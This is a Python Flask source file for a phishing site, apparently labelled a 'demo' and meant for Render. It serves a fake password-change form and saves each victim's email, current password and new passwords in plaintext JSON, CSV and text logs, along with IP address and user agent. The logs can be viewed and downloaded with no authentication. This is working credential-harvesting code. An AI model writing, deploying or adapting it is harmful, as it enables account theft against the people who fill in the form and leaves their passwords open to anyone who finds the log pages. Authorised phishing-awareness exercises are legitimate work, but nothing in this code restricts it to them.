import os
import csv
import json
import socket
import uuid
import platform
import datetime
import re

from flask import Flask, render_template, request, redirect, send_file, Response, jsonify

# Set up base paths for where files live and where we'll store log data
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.environ.get('DATA_DIR', os.path.join(BASE_DIR, 'data'))
LOG_JSON = os.path.join(DATA_DIR, 'submissions.json')
LOG_CSV = os.path.join(DATA_DIR, 'submissions.csv')
LOG_TXT = os.path.join(DATA_DIR, 'submissions.txt')

# Create the Flask app
app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), static_url_path='/assets')
app.secret_key = os.environ.get('SECRET_KEY', 'gu_phishing_secret')

# Make sure log files exist before anyone submits anything

def init_logs():
    os.makedirs(DATA_DIR, exist_ok=True)

    # Create the CSV file with column headers if it doesn't exist
    if not os.path.exists(LOG_CSV):
        with open(LOG_CSV, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'timestamp', 'email', 'current_password', 'new_password',
                'confirm_password', 'ip_address', 'mac_address',
                'hostname', 'user_agent'
            ])

    # Just touch the JSON and TXT log files if they aren't there
    for path in (LOG_JSON, LOG_TXT):
        if not os.path.exists(path):
            open(path, 'w').close()
            if path == LOG_TXT:
                with open(LOG_TXT, 'a') as f:
                    f.write('=== Phishing Demo Submissions ===\n' + '='*80 + '\n')

init_logs()

# Grab the MAC address of the machine (even if it's kinda spoofable)
def get_mac_address():
    try:
        mac = uuid.getnode()
        return ':'.join(re.findall('..', f"{mac:012x}"))
    except Exception:
        return 'unknown'

# Get basic OS and hardware info

def get_system_info():
    try:
        return {
            'platform': platform.platform(),
            'machine': platform.machine(),
            'processor': platform.processor(),
        }
    except Exception:
        return {}

# Format the text log so it's readable and structured nicely

def format_log(entry):
    info = '\n'.join(f"  {k}: {v}" for k, v in entry['system_info'].items())
    return (
        f"=== Submission at {entry['timestamp']} ===\n"
        f"Email: {entry['email']}\n"
        f"Current: {entry['current_password']}\n"
        f"New: {entry['new_password']}\n"
        f"Confirm: {entry['confirm_password']}\n"
        f"IP: {entry['ip_address']}\n"
        f"MAC: {entry['mac_address']}\n"
        f"Host: {entry['hostname']}\n"
        f"Agent: {entry['user_agent']}\n\n"
        f"System Info:\n{info}\n"
    )

# Homepage route – just renders the main login page
@app.route('/')
def index():
    return render_template('index.html')

# Handle form submissions – this is where the fake login form sends data
@app.route('/submit', methods=['POST'])
def submit():
    now = datetime.datetime.utcnow().isoformat()
    email = request.form.get('email', '')
    current_password = request.form.get('currentPassword', '')
    new_password = request.form.get('newPassword', '')
    confirm_password = request.form.get('confirmPassword', '')

    # Build a dictionary of everything we want to log
    entry = {
        'timestamp': now,
        'email': email,
        'current_password': current_password,
        'new_password': new_password,
        'confirm_password': confirm_password,
        'ip_address': request.headers.get('X-Forwarded-For', request.remote_addr),
        'mac_address': get_mac_address(),
        'hostname': socket.gethostname(),
        'user_agent': request.headers.get('User-Agent'),
        'system_info': get_system_info(),
    }

    # Save it in JSON format (one object per line)
    with open(LOG_JSON, 'a') as f:
        json.dump(entry, f)
        f.write('\n')

    # Save it in CSV format for spreadsheet stuff
    with open(LOG_CSV, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            entry['timestamp'], entry['email'], entry['current_password'],
            entry['new_password'], entry['confirm_password'], entry['ip_address'],
            entry['mac_address'], entry['hostname'], entry['user_agent'],
        ])

    # Save it in TXT for the logs page to read easily
    with open(LOG_TXT, 'a') as f:
        f.write(format_log(entry) + '\n' + '-'*80 + '\n')

    return redirect('/success')

# After submission, show the user a success screen (even though it’s a trap)
@app.route('/success')
def success():
    return render_template('success.html')

# Render the logs page so we can see what’s been collected
@app.route('/view-logs')
def view_logs():
    with open(LOG_TXT) as f:
        content = f.read()
    total = content.count('=== Submission at')
    return render_template('logs.html', logs=content, total=total)

# Let users download any log format they want
@app.route('/data/<kind>')
def download(kind):
    files = {'json': LOG_JSON, 'csv': LOG_CSV, 'txt': LOG_TXT}
    path = files.get(kind)
    if not path:
        return jsonify(error='use json, csv, or txt'), 400
    return send_file(path, as_attachment=True, download_name=f'submissions.{kind}')

# Only used locally – in production, Render uses gunicorn
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
